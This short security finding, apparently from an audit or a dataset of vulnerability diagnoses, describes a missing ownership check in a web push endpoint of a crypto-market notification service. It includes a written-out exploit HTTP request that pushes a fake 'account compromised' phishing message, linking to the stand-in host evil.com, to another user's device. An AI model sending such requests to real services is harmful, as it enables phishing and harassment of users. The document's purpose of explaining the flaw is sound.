diagnosis: WebPushDirectDispatchView takes an arbitrary device_id and dispatches a web push notification without checking if the recipient device belongs to the requesting user. An attacker can send spoofed security prompts, phishing messages, or harassment notifications directly to other users' browsers.
exploit_request:
POST /api/notifications/webpush/test-send/ HTTP/1.1
Host: notify.cryptomarket.com
Authorization: Bearer unprivileged_user_token
Content-Type: application/json

{"device_id": 714, "message": "Urgent: Account compromised. Click here: https://evil.com/reset"}
